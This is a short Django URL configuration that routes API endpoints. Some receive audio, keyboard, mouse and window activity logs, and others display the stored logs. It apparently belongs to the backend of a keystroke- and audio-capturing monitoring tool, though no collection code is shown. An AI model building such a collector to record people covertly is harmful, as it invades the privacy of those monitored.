from django.conf.urls import url
from . import views

urlpatterns = [
    url(r'^api/send_audio_logs$', views.send_audio_logs),
    url(r'^api/send_keyboard_logs$', views.send_keyboard_logs),
    url(r'^api/send_mouse_logs$', views.send_mouse_logs),
    url(r'^api/send_window_logs$', views.send_window_logs),
    url(r'^api/send_pics$', views.not_implemented),
    url(r'^api/read_all_users$', views.not_implemented),
    url(r'^api/show_audio_db$', views.show_audio),
    url(r'^api/show_keyboard_db$', views.show_keyboard),
    url(r'^api/show_mouse_db$', views.show_mouse),
    url(r'^api/show_window_db$', views.show_window),
]